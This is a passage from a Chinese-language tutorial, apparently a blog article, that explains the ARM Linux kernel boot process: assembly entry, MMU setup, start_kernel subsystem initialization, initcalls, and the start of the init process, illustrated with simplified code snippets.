<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">decompress_kernel</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> output_start,
                       <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_mem_ptr_p,
                       <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_mem_ptr_end_p,
                       <span class="hljs-type">int</span> arch_id)</span>
{
    <span class="hljs-comment">// 选择解压算法</span>
    <span class="hljs-comment">// 调用相应的解压函数</span>
    <span class="hljs-comment">// 解压内核到output_start</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-36">5. 内核早期汇编初始化</h2>
<h3 data-id="heading-37">5.1 内核入口点</h3>
<h4 data-id="heading-38">5.1.1 入口点位置</h4>
<p>内核的汇编入口点在 <code>arch/arm/kernel/head.S</code>:</p>
<pre><code class="hljs language-assembly" lang="assembly">__HEAD
ENTRY(stext)
    // 内核从这里开始执行
    // MMU关闭，使用物理地址
</code></pre>
<h4 data-id="heading-39">5.1.2 入口时的CPU状态</h4>
<p>内核入口时，CPU处于以下状态：</p>
<ul>
<li><strong>MMU</strong>: 关闭</li>
<li><strong>Cache</strong>: 关闭</li>
<li><strong>中断</strong>: 关闭</li>
<li><strong>寄存器</strong>:
<ul>
<li>r0 = 0</li>
<li>r1 = 机器类型ID</li>
<li>r2 = ATAGs/DTB物理地址</li>
</ul>
</li>
</ul>
<h4 data-id="heading-40">5.1.3 为什么需要汇编初始化？</h4>
<p>在启用MMU和Cache之前，必须使用汇编代码：</p>
<ul>
<li>C编译器生成的代码依赖栈和全局变量</li>
<li>栈和全局变量需要MMU映射</li>
<li>因此需要汇编代码先设置MMU</li>
</ul>
<h3 data-id="heading-41">5.2 处理器类型检测</h3>
<h4 data-id="heading-42">5.2.1 检测目的</h4>
<p>内核需要知道运行在哪种CPU上，以：</p>
<ul>
<li>选择正确的CPU特定代码</li>
<li>设置CPU特定的寄存器</li>
<li>启用CPU特定的功能</li>
</ul>
<h4 data-id="heading-43">5.2.2 检测过程</h4>
<pre><code class="hljs language-assembly" lang="assembly">// 读取CPU ID
mrc p15, 0, r9, c0, c0    @ 读取处理器ID到r9

// 查找处理器类型
bl  __lookup_processor_type  @ 查找处理器信息

// 检查是否支持
movs r10, r5              @ r5是处理器信息指针
beq  __error_p             @ 如果不支持，报错
</code></pre>
<h4 data-id="heading-44">5.2.3 处理器信息结构</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_info_list</span> {</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    cpu_val;      <span class="hljs-comment">// CPU ID值</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    cpu_mask;     <span class="hljs-comment">// CPU ID掩码</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>   __cpu_mm_mmu_flags;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>   __cpu_io_mmu_flags;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>   __cpu_flush;  <span class="hljs-comment">// 缓存刷新函数</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>      *arch_name;
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>      *elf_name;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    elf_hwcap;
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>      *cpu_name;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">processor</span> *<span class="hljs-title">proc</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu_tlb_fns</span> *<span class="hljs-title">tlb</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu_user_fns</span> *<span class="hljs-title">user</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu_cache_fns</span> *<span class="hljs-title">cache</span>;</span>
};
</code></pre>
<h3 data-id="heading-45">5.3 ATAGs/DTB验证</h3>
<h4 data-id="heading-46">5.3.1 验证目的</h4>
<p>确保Bootloader传递的参数有效：</p>
<ul>
<li>ATAGs指针有效</li>
<li>或设备树指针有效</li>
<li>数据结构格式正确</li>
</ul>
<h4 data-id="heading-47">5.3.2 验证代码</h4>
<pre><code class="hljs language-assembly" lang="assembly">__vet_atags:
    // 检查对齐
    tst r2, #0x3           @ 检查是否4字节对齐
    bne 1f                 @ 不对齐则无效
    
    // 检查ATAG_CORE
    ldr r5, [r2, #0]       @ 读取第一个tag
    cmp r5, #ATAG_CORE_SIZE
    bne 1f                 @ 不是ATAG_CORE则无效
    
    // 检查ATAG_CORE标记
    ldr r5, [r2, #4]
    ldr r6, =ATAG_CORE
    cmp r5, r6
    bne 1f                 @ 标记不匹配则无效
    
    // 或者检查设备树
    ldr r6, =OF_DT_MAGIC
    cmp r5, r6
    beq 2f                 @ 是设备树则有效
    
1:  mov r2, #0             @ 无效，清空r2
2:  ret lr                 @ 返回
</code></pre>
<h3 data-id="heading-48">5.4 页表创建</h3>
<h4 data-id="heading-49">5.4.1 为什么需要页表？</h4>
<p>MMU需要页表来：</p>
<ul>
<li>将虚拟地址转换为物理地址</li>
<li>设置内存访问权限</li>
<li>启用内存保护</li>
</ul>
<h4 data-id="heading-50">5.4.2 早期页表结构</h4>
<p>早期页表只映射必要的区域：</p>
<pre><code class="hljs language-assembly" lang="assembly">__create_page_tables:
    // 1. 清除页表
    mov r0, r4              @ r4是页表地址
    mov r3, #0
    add r6, r0, #PG_DIR_SIZE
1:  str r3, [r0], #4       @ 清零页表
    teq r0, r6
    bne 1b
    
    // 2. 映射内核代码段
    // 创建页表项，映射内核的.text段
    
    // 3. 映射页表自身
    // 创建页表项，映射页表区域
</code></pre>
<h4 data-id="heading-51">5.4.3 页表映射范围</h4>
<p>早期页表通常映射：</p>
<ul>
<li><strong>内核代码段</strong> (.text): 可执行、只读</li>
<li><strong>内核数据段</strong> (.data, .bss): 可读写</li>
<li><strong>页表区域</strong>: 可读写</li>
<li><strong>设备树/ATAGs</strong>: 只读</li>
</ul>
<h3 data-id="heading-52">5.5 MMU启用</h3>
<h4 data-id="heading-53">5.5.1 MMU启用的步骤</h4>
<pre><code class="hljs language-assembly" lang="assembly">__enable_mmu:
    // 1. 设置页表基址
    mov r4, #swapper_pg_dir  @ 页表地址
    mcr p15, 0, r4, c2, c0, 0 @ 写入TTBR0
    
    // 2. 设置域访问控制
    mov r5, #0x1fffffff      @ 所有域为客户端
    mcr p15, 0, r5, c3, c0, 0 @ 写入DACR
    
    // 3. 设置MMU控制寄存器
    mrc p15, 0, r0, c1, c0, 0 @ 读取SCTLR
    orr r0, r0, #0x1         @ 启用MMU
    mcr p15, 0, r0, c1, c0, 0 @ 写入SCTLR
    
    // 4. 跳转到虚拟地址
    b   __mmap_switched
</code></pre>
<h4 data-id="heading-54">5.5.2 MMU启用后的变化</h4>
<p>启用MMU后：</p>
<ul>
<li><strong>地址空间</strong>: 从物理地址切换到虚拟地址</li>
<li><strong>内存保护</strong>: 可以设置访问权限</li>
<li><strong>Cache</strong>: 可以启用Cache加速</li>
</ul>
<h4 data-id="heading-55">5.5.3 地址切换</h4>
<pre><code class="hljs language-assembly" lang="assembly">__mmap_switched:
    // 现在使用虚拟地址
    // 设置栈指针（虚拟地址）
    ldr sp, =init_thread_union + THREAD_START_SP
    
    // 保存处理器ID、机器类型、ATAGs地址
    str r9, [r0]            @ 保存处理器ID
    str r7, [r1]            @ 保存机器类型
    str r8, [r2]            @ 保存ATAGs地址
    
    // 跳转到C代码
    b   start_kernel
</code></pre>
<h3 data-id="heading-56">5.6 跳转到C代码</h3>
<h4 data-id="heading-57">5.6.1 跳转前的准备</h4>
<p>在跳转到C代码前，需要：</p>
<ol>
<li><strong>启用MMU</strong>: 已完成</li>
<li><strong>设置栈指针</strong>: 已完成</li>
<li><strong>清除BSS段</strong>: 需要完成</li>
<li><strong>保存启动参数</strong>: 已完成</li>
</ol>
<h4 data-id="heading-58">5.6.2 BSS段清除</h4>
<p>BSS段包含未初始化的全局变量，需要清零：</p>
<pre><code class="hljs language-assembly" lang="assembly">// 清除BSS段
ldr r0, =__bss_start
ldr r1, =__bss_stop
mov r2, #0
1:  cmp r0, r1
    strlt r2, [r0], #4
    blt  1b
</code></pre>
<h4 data-id="heading-59">5.6.3 跳转到start_kernel</h4>
<pre><code class="hljs language-assembly" lang="assembly">// 跳转到C代码入口
mov lr, #0
b   start_kernel
</code></pre>
<p>此时：</p>
<ul>
<li>MMU已启用</li>
<li>栈已设置</li>
<li>BSS已清除</li>
<li>可以安全地调用C函数</li>
</ul>
<hr/>
<h2 data-id="heading-60">6. C语言初始化 - start_kernel</h2>
<h3 data-id="heading-61">6.1 start_kernel概述</h3>
<h4 data-id="heading-62">6.1.1 start_kernel的作用</h4>
<p><code>start_kernel</code>是内核C语言代码的入口点，负责：</p>
<ul>
<li>初始化内核各个子系统</li>
<li>设置内核运行环境</li>
<li>启动第一个用户进程</li>
</ul>
<h4 data-id="heading-63">6.1.2 start_kernel的位置</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// init/main.c</span>
asmlinkage __visible <span class="hljs-type">void</span> __init __no_sanitize_address <span class="hljs-title function_">start_kernel</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// 内核初始化代码</span>
}
</code></pre>
<h4 data-id="heading-64">6.1.3 start_kernel的执行环境</h4>
<p>执行<code>start_kernel</code>时：</p>
<ul>
<li><strong>MMU</strong>: 已启用</li>
<li><strong>中断</strong>: 已禁用</li>
<li><strong>当前进程</strong>: init_task（内核的第一个任务）</li>
<li><strong>栈</strong>: 使用init_task的栈</li>
</ul>
<h3 data-id="heading-65">6.2 早期初始化</h3>
<h4 data-id="heading-66">6.2.1 栈溢出检测设置</h4>
<pre><code class="hljs language-c" lang="c">set_task_stack_end_magic(&amp;init_task);
</code></pre>
<p><strong>作用</strong>: 在init_task栈的末尾设置魔数，用于检测栈溢出。</p>
<p><strong>原理</strong>: 如果栈溢出，会覆盖栈末尾的魔数，内核可以检测到。</p>
<h4 data-id="heading-67">6.2.2 处理器ID设置</h4>
<pre><code class="hljs language-c" lang="c">smp_setup_processor_id();
</code></pre>
<p><strong>作用</strong>: 设置当前CPU的ID。</p>
<p><strong>用途</strong>: 用于SMP（多核）系统中识别当前CPU。</p>
<h4 data-id="heading-68">6.2.3 调试对象早期初始化</h4>
<pre><code class="hljs language-c" lang="c">debug_objects_early_init();
</code></pre>
<p><strong>作用</strong>: 初始化调试对象跟踪系统。</p>
<p><strong>用途</strong>: 用于检测内核对象的使用错误（如使用已释放的对象）。</p>
<h4 data-id="heading-69">6.2.4 构建ID初始化</h4>
<pre><code class="hljs language-c" lang="c">init_vmlinux_build_id();
</code></pre>
<p><strong>作用</strong>: 初始化内核构建ID。</p>
<p><strong>用途</strong>: 用于调试，标识内核版本和构建信息。</p>
<h4 data-id="heading-70">6.2.5 Cgroup早期初始化</h4>
<pre><code class="hljs language-c" lang="c">cgroup_init_early();
</code></pre>
<p><strong>作用</strong>: 初始化控制组（cgroup）子系统。</p>
<p><strong>用途</strong>: 用于资源限制和进程分组。</p>
<h3 data-id="heading-71">6.3 中断和锁初始化</h3>
<h4 data-id="heading-72">6.3.1 禁用中断</h4>
<pre><code class="hljs language-c" lang="c">local_irq_disable();
early_boot_irqs_disabled = <span class="hljs-literal">true</span>;
</code></pre>
<p><strong>作用</strong>: 确保在早期初始化期间中断被禁用。</p>
<p><strong>原因</strong>: 早期初始化时，中断处理可能还未准备好。</p>
<h4 data-id="heading-73">6.3.2 引导CPU初始化</h4>
<pre><code class="hljs language-c" lang="c">boot_cpu_init();
</code></pre>
<p><strong>作用</strong>: 初始化引导CPU（第一个CPU）。</p>
<p><strong>任务</strong>:</p>
<ul>
<li>标记CPU为在线状态</li>
<li>设置CPU的掩码</li>
<li>初始化CPU相关的数据结构</li>
</ul>
<h4 data-id="heading-74">6.3.3 页地址初始化</h4>
<pre><code class="hljs language-c" lang="c">page_address_init();
</code></pre>
<p><strong>作用</strong>: 初始化页地址映射系统。</p>
<p><strong>用途</strong>: 用于将物理页映射到内核地址空间。</p>
<h3 data-id="heading-75">6.4 架构相关初始化</h3>
<h4 data-id="heading-76">6.4.1 setup_arch</h4>
<pre><code class="hljs language-c" lang="c">setup_arch(&amp;command_line);
</code></pre>
<p><strong>作用</strong>: 执行架构相关的初始化。</p>
<p><strong>主要任务</strong>:</p>
<ol>
<li><strong>解析启动参数</strong>: 解析ATAGs或设备树</li>
<li><strong>内存初始化</strong>: 初始化内存管理</li>
<li><strong>CPU初始化</strong>: 初始化CPU特定功能</li>
<li><strong>设备树解析</strong>: 解析设备树，初始化设备</li>
<li><strong>命令行参数</strong>: 提取内核命令行参数</li>
</ol>
<p><strong>代码位置</strong>: <code>arch/arm/kernel/setup.c</code></p>
<h4 data-id="heading-77">6.4.2 内存初始化</h4>
<p>在<code>setup_arch</code>中，会初始化内存：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 解析内存信息（从ATAGs或设备树）</span>
setup_machine_fdt(__atags_pointer);
<span class="hljs-comment">// 或</span>
setup_machine_tags(__atags_pointer);

<span class="hljs-comment">// 初始化memblock（早期内存分配器）</span>
arm_memblock_init();
</code></pre>
<h4 data-id="heading-78">6.4.3 设备树解析</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 解析设备树</span>
unflatten_device_tree();

<span class="hljs-comment">// 初始化设备</span>
of_platform_populate();
</code></pre>
<h3 data-id="heading-79">6.5 命令行参数处理</h3>
<h4 data-id="heading-80">6.5.1 保存命令行</h4>
<pre><code class="hljs language-c" lang="c">setup_command_line(command_line);
</code></pre>
<p><strong>作用</strong>: 保存原始和解析后的命令行参数。</p>
<p><strong>保存的内容</strong>:</p>
<ul>
<li><code>saved_command_line</code>: 原始命令行</li>
<li><code>static_command_line</code>: 解析后的命令行</li>
</ul>
<h4 data-id="heading-81">6.5.2 解析早期参数</h4>
<pre><code class="hljs language-c" lang="c">parse_early_param();
</code></pre>
<p><strong>作用</strong>: 解析需要在早期处理的参数。</p>
<p><strong>早期参数示例</strong>:</p>
<ul>
<li><code>console=</code>: 设置控制台</li>
<li><code>earlyprintk=</code>: 早期打印</li>
<li><code>mem=</code>: 内存大小</li>
<li><code>initrd=</code>: initrd地址</li>
</ul>
<h4 data-id="heading-82">6.5.3 解析常规参数</h4>
<pre><code class="hljs language-c" lang="c">parse_args(<span class="hljs-string">"Booting kernel"</span>, static_command_line, ...);
</code></pre>
<p><strong>作用</strong>: 解析所有内核参数。</p>
<p><strong>参数类型</strong>:</p>
<ul>
<li>模块参数</li>
<li>内核选项</li>
<li>传递给init的参数</li>
</ul>
<h3 data-id="heading-83">6.6 内存管理初始化</h3>
<h4 data-id="heading-84">6.6.1 内存管理概述</h4>
<p>内存管理是内核的核心子系统，需要早期初始化。</p>
<h4 data-id="heading-85">6.6.2 构建内存区域列表</h4>
<pre><code class="hljs language-c" lang="c">build_all_zonelists(<span class="hljs-literal">NULL</span>);
</code></pre>
<p><strong>作用</strong>: 构建所有节点的内存区域列表。</p>
<p><strong>内存区域类型</strong>:</p>
<ul>
<li><strong>ZONE_DMA</strong>: DMA可用内存</li>
<li><strong>ZONE_NORMAL</strong>: 普通内存</li>
<li><strong>ZONE_HIGHMEM</strong>: 高端内存（32位系统）</li>
</ul>
<h4 data-id="heading-86">6.6.3 页分配器初始化</h4>
<pre><code class="hljs language-c" lang="c">page_alloc_init();
</code></pre>
<p><strong>作用</strong>: 初始化页分配器。</p>
<p><strong>页分配器</strong>: 负责分配和释放物理页。</p>
<h4 data-id="heading-87">6.6.4 完整内存管理初始化</h4>
<pre><code class="hljs language-c" lang="c">mm_init();
</code></pre>
<p><strong>作用</strong>: 完整初始化内存管理子系统。</p>
<p><strong>主要任务</strong>:</p>
<ol>
<li><strong>页扩展初始化</strong>: <code>page_ext_init_flatmem()</code></li>
<li><strong>内存调试</strong>: <code>init_mem_debugging_and_hardening()</code></li>
<li><strong>KASAN初始化</strong>: <code>kfence_alloc_pool()</code>（如果启用）</li>
<li><strong>内存初始化报告</strong>: <code>report_meminit()</code></li>
<li><strong>栈仓库初始化</strong>: <code>stack_depot_init()</code></li>
<li><strong>内存初始化</strong>: <code>mem_init()</code></li>
<li><strong>SLAB分配器初始化</strong>: <code>kmem_cache_init()</code></li>
<li><strong>Kmemleak初始化</strong>: <code>kmemleak_init()</code></li>
<li><strong>页表初始化</strong>: <code>pgtable_init()</code></li>
<li><strong>vmalloc初始化</strong>: <code>vmalloc_init()</code></li>
</ol>
<h3 data-id="heading-88">6.7 调度器初始化</h3>
<h4 data-id="heading-89">6.7.1 调度器概述</h4>
<p>调度器负责决定哪个进程在CPU上运行。</p>
<h4 data-id="heading-90">6.7.2 调度器初始化</h4>
<pre><code class="hljs language-c" lang="c">sched_init();
</code></pre>
<p><strong>作用</strong>: 初始化进程调度器。</p>
<p><strong>主要任务</strong>:</p>
<ol>
<li><strong>初始化运行队列</strong>: 为每个CPU创建运行队列</li>
<li><strong>初始化调度类</strong>: 初始化CFS、RT等调度类</li>
<li><strong>初始化负载均衡</strong>: 初始化负载均衡器</li>
<li><strong>设置调度域</strong>: 设置CPU调度域</li>
</ol>
<p><strong>代码位置</strong>: <code>kernel/sched/core.c</code></p>
<h4 data-id="heading-91">6.7.3 为什么需要早期初始化调度器？</h4>
<p>调度器需要早期初始化，因为：</p>
<ul>
<li>后续的初始化可能创建内核线程</li>
<li>内核线程需要调度器来运行</li>
<li>多核系统需要调度器来分配任务</li>
</ul>
<h3 data-id="heading-92">6.8 中断系统初始化</h3>
<h4 data-id="heading-93">6.8.1 中断概述</h4>
<p>中断是硬件通知CPU有事件发生的方式。</p>
<h4 data-id="heading-94">6.8.2 早期中断初始化</h4>
<pre><code class="hljs language-c" lang="c">early_irq_init();
</code></pre>
<p><strong>作用</strong>: 早期初始化中断系统。</p>
<p><strong>任务</strong>:</p>
<ul>
<li>初始化中断描述符</li>
<li>设置中断向量表</li>
<li>初始化中断控制器</li>
</ul>
<h4 data-id="heading-95">6.8.3 完整中断初始化</h4>
<pre><code class="hljs language-c" lang="c">init_IRQ();
</code></pre>
<p><strong>作用</strong>: 完整初始化中断系统。</p>
<p><strong>任务</strong>:</p>
<ul>
<li>初始化所有中断</li>
<li>设置中断处理函数</li>
<li>启用中断控制器</li>
</ul>
<h4 data-id="heading-96">6.8.4 中断处理流程</h4>
<pre><code class="hljs language-markdown" lang="markdown">硬件产生中断
<span class="hljs-code">    ↓
中断控制器通知CPU
    ↓
CPU跳转到中断向量
    ↓
调用中断处理函数
    ↓
执行中断服务例程
    ↓
返回被中断的代码
</span></code></pre>
<h3 data-id="heading-97">6.9 定时器初始化</h3>
<h4 data-id="heading-98">6.9.1 定时器概述</h4>
<p>定时器用于：</p>
<ul>
<li>时间测量</li>
<li>延迟执行</li>
<li>周期性任务</li>
</ul>
<h4 data-id="heading-99">6.9.2 定时器初始化步骤</h4>
<pre><code class="hljs language-c" lang="c">tick_init();           <span class="hljs-comment">// 初始化tick</span>
init_timers();         <span class="hljs-comment">// 初始化定时器</span>
hrtimers_init();       <span class="hljs-comment">// 初始化高精度定时器</span>
timekeeping_init();    <span class="hljs-comment">// 初始化时间保持</span>
time_init();           <span class="hljs-comment">// 架构相关时间初始化</span>
</code></pre>
<h4 data-id="heading-100">6.9.3 时间系统</h4>
<pre><code class="hljs language-c" lang="c">timekeeping_init();
</code></pre>
<p><strong>作用</strong>: 初始化内核时间系统。</p>
<p><strong>时间系统包括</strong>:</p>
<ul>
<li><strong>系统时间</strong>: 从1970年1月1日开始的秒数</li>
<li><strong>单调时间</strong>: 从启动开始的纳秒数</li>
<li><strong>时钟源</strong>: 硬件时钟源（如RTC、TSC）</li>
</ul>
<h3 data-id="heading-101">6.10 控制台初始化</h3>
<h4 data-id="heading-102">6.10.1 控制台概述</h4>
<p>控制台用于内核输出信息，是调试和监控的重要工具。</p>
<h4 data-id="heading-103">6.10.2 控制台初始化</h4>
<pre><code class="hljs language-c" lang="c">console_init();
</code></pre>
<p><strong>作用</strong>: 初始化控制台系统。</p>
<p><strong>任务</strong>:</p>
<ol>
<li><strong>注册控制台驱动</strong>: 注册串口、VGA等控制台</li>
<li><strong>设置默认控制台</strong>: 选择默认输出设备</li>
<li><strong>启用控制台输出</strong>: 允许内核打印信息</li>
</ol>
<h4 data-id="heading-104">6.10.3 控制台类型</h4>
<ul>
<li><strong>串口控制台</strong>: 通过UART输出</li>
<li><strong>VGA控制台</strong>: 通过VGA显示</li>
<li><strong>网络控制台</strong>: 通过网络输出</li>
<li><strong>USB控制台</strong>: 通过USB输出</li>
</ul>
<h3 data-id="heading-105">6.11 Initcall机制</h3>
<h4 data-id="heading-106">6.11.1 Initcall概述</h4>
<p>Initcall是内核的初始化调用机制，用于按顺序初始化各个子系统。</p>
<h4 data-id="heading-107">6.11.2 Initcall级别</h4>
<p>内核定义了多个initcall级别：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 定义在 include/linux/init.h</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> __define_initcall(fn, id) \
    static initcall_t __initcall_##fn##id __used \
    __attribute__((__section__(<span class="hljs-string">".initcall"</span> #id <span class="hljs-string">".init"</span>))) = fn</span>

<span class="hljs-comment">// Initcall级别</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> pure_initcall(fn)           __define_initcall(fn, 0)  <span class="hljs-comment">// 纯初始化</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> core_initcall(fn)           __define_initcall(fn, 1)  <span class="hljs-comment">// 核心初始化</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> postcore_initcall(fn)       __define_initcall(fn, 2)  <span class="hljs-comment">// 核心后初始化</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> arch_initcall(fn)           __define_initcall(fn, 3)  <span class="hljs-comment">// 架构初始化</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> subsys_initcall(fn)         __define_initcall(fn, 4)  <span class="hljs-comment">// 子系统初始化</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> fs_initcall(fn)             __define_initcall(fn, 5)  <span class="hljs-comment">// 文件系统初始化</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> device_initcall(fn)         __define_initcall(fn, 6)  <span class="hljs-comment">// 设备初始化</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> late_initcall(fn)           __define_initcall(fn, 7)  <span class="hljs-comment">// 晚期初始化</span></span>
</code></pre>
<h4 data-id="heading-108">6.11.3 Initcall执行顺序</h4>
<pre><code class="hljs language-c" lang="c">do_initcalls();
</code></pre>
<p><strong>执行顺序</strong>:</p>
<ol>
<li><strong>pure_initcall</strong>: 最基础的初始化</li>
<li><strong>core_initcall</strong>: 核心子系统</li>
<li><strong>postcore_initcall</strong>: 核心子系统之后</li>
<li><strong>arch_initcall</strong>: 架构相关</li>
<li><strong>subsys_initcall</strong>: 子系统</li>
<li><strong>fs_initcall</strong>: 文件系统</li>
<li><strong>device_initcall</strong>: 设备驱动</li>
<li><strong>late_initcall</strong>: 最后初始化</li>
</ol>
<h4 data-id="heading-109">6.11.4 Initcall示例</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 设备驱动初始化</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">my_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// 初始化代码</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
device_initcall(my_driver_init);  <span class="hljs-comment">// 在device_initcall级别执行</span>
</code></pre>
<h3 data-id="heading-110">6.12 基本设置</h3>
<h4 data-id="heading-111">6.12.1 do_basic_setup</h4>
<pre><code class="hljs language-c" lang="c">do_basic_setup();
</code></pre>
<p><strong>作用</strong>: 执行基本的系统设置。</p>
<p><strong>包括</strong>:</p>
<ol>
<li><strong>CPU集合初始化</strong>: <code>cpuset_init_smp()</code></li>
<li><strong>驱动初始化</strong>: <code>driver_init()</code></li>
<li><strong>中断proc文件</strong>: <code>init_irq_proc()</code></li>
<li><strong>构造函数</strong>: <code>do_ctors()</code></li>
<li><strong>Initcalls</strong>: <code>do_initcalls()</code></li>
</ol>
<h4 data-id="heading-112">6.12.2 驱动初始化</h4>
<pre><code class="hljs language-c" lang="c">driver_init();
</code></pre>
<p><strong>作用</strong>: 初始化驱动子系统。</p>
<p><strong>任务</strong>:</p>
<ul>
<li>初始化设备模型</li>
<li>初始化总线</li>
<li>初始化设备类</li>
</ul>
<h3 data-id="heading-113">6.13 准备启动用户空间</h3>
<h4 data-id="heading-114">6.13.1 rest_init</h4>
<pre><code class="hljs language-c" lang="c">rest_init();
</code></pre>
<p><strong>作用</strong>: 启动剩余的初始化工作。</p>
<p><strong>主要任务</strong>:</p>
<ol>
<li><strong>启动init进程</strong>: 创建第一个用户进程</li>
<li><strong>启动kthreadd</strong>: 创建内核线程守护进程</li>
<li><strong>进入idle</strong>: 当前任务进入idle循环</li>
</ol>
<h4 data-id="heading-115">6.13.2 启动init进程</h4>
<pre><code class="hljs language-c" lang="c">pid = kernel_thread(kernel_init, <span class="hljs-literal">NULL</span>, CLONE_FS);
</code></pre>
<p><strong>作用</strong>: 创建init进程（PID 1）。</p>
<p><strong>kernel_init</strong>: init进程的主函数，负责启动用户空间。</p>
<h4 data-id="heading-116">6.13.3 启动kthreadd</h4>
<pre><code class="hljs language-c" lang="c">pid = kernel_thread(kthreadd, <span class="hljs-literal">NULL</span>, CLONE_FS | CLONE_FILES);
</code></pre>
<p><strong>作用</strong>: 创建kthreadd进程（内核线程守护进程）。</p>
<p><strong>kthreadd</strong>: 负责创建和管理内核线程。</p>
<h4 data-id="heading-117">6.13.4 进入idle</h4>
<pre><code class="hljs language-c" lang="c">schedule_preempt_disabled();
cpu_startup_entry(CPUHP_ONLINE);
</code></pre>
<p><strong>作用</strong>: 当前任务（init_task）进入idle循环。</p>
<p><strong>idle循环</strong>: 当没有其他任务运行时，CPU执行idle任务。</p>
<hr/>
<h2 data-id="heading-118">7. Init进程启动</h2>
<h3 data-id="heading-119">7.1 kernel_init概述</h3>
<h4 data-id="heading-120">7.1.1 kernel_init的作用</h4>
<p><code>kernel_init</code>是init进程的主函数，负责：</p>
<ul>
<li>完成内核初始化</li>
<li>挂载根文件系统</li>
<li>启动用户空间的init程序</li>
</ul>
<h4 data-id="heading-121">7.1.2 kernel_init的位置</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// init/main.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> __ref <span class="hljs-title function_">kernel_init</span><span class="hljs-params">(<span class="hljs-type">void</span> *unused)</span>
{
    <span class="hljs-comment">// init进程代码</span>
}
</code></pre>
<h4 data-id="heading-122">7.1.3 kernel_init的执行环境</h4>
<p>执行<code>kernel_init</code>时：</p>
<ul>
<li><strong>进程</strong>: 新的内核线程，将成为init进程</li>
<li><strong>PID</strong>: 1</li>
<li><strong>权限</strong>: 内核权限（稍后会切换到用户空间）</li>
</ul>
<h3 data-id="heading-123">7.2 等待kthreadd就绪</h3>
<h4 data-id="heading-124">7.2.1 为什么需要等待？</h4>
<pre><code class="hljs language-c" lang="c">wait_for_completion(&amp;kthreadd_done);
</code></pre>
<p><strong>原因</strong>: kthreadd需要先就绪，因为后续初始化可能需要创建内核线程。</p>
<p><strong>机制</strong>: 使用完成量（completion）同步。</p>
<h3 data-id="heading-125">7.3 kernel_init_freeable</h3>
<h4 data-id="heading-126">7.3.1 可释放初始化</h4>
<pre><code class="hljs language-c" lang="c">kernel_init_freeable();
</code></pre>
<p><strong>作用</strong>: 执行可以释放初始化内存的初始化工作。</p>
<p><strong>为什么叫"freeable"</strong>: 这些初始化完成后，可以释放初始化时使用的内存。</p>
<h4 data-id="heading-127">7.3.2 主要任务</h4>
<ol>
<li>
<p><strong>设置内存分配掩码</strong></p>
<pre><code class="hljs language-c" lang="c">gfp_allowed_mask = __GFP_BITS_MASK;
</code></pre>
<p>允许使用所有内存分配标志。</p>
</li>
<li>
<p><strong>设置内存节点</strong></p>
<pre><code class="hljs language-c" lang="c">set_mems_allowed(node_states[N_MEMORY]);
</code></pre>
<p>允许在任意内存节点分配内存。</p>
</li>
<li>
<p><strong>SMP准备</strong></p>
<pre><code class="hljs language-c" lang="c">smp_prepare_cpus(setup_max_cpus);
</code></pre>
<p>准备其他CPU。</p>
</li>
<li>
<p><strong>工作队列初始化</strong></p>
<pre><code class="hljs language-c" lang="c">workqueue_init();
</code></pre>
<p>初始化工作队列系统。</p>
</li>
<li>
<p><strong>内存管理内部初始化</strong></p>
<pre><code class="hljs language-c" lang="c">init_mm_internals();
</code></pre>
<p>初始化内存管理内部结构。</p>
</li>
<li>
<p><strong>早期Initcalls</strong></p>
<pre><code class="hljs language-c" lang="c">do_pre_smp_initcalls();
</code></pre>
<p>执行SMP之前的initcalls。</p>
</li>
<li>
<p><strong>锁检测器初始化</strong></p>
<pre><code class="hljs language-c" lang="c">lockup_detector_init();
</code></pre>
<p>初始化死锁检测器。</p>
</li>
<li>
<p><strong>SMP初始化</strong></p>
<pre><code class="hljs language-c" lang="c">smp_init();
</code></pre>
<p>启动其他CPU。</p>
</li>
<li>
<p><strong>调度器SMP初始化</strong></p>
<pre><code class="hljs language-c" lang="c">sched_init_smp();
</code></pre>
<p>初始化SMP调度。</p>
</li>
<li>
<p><strong>基本设置</strong></p>
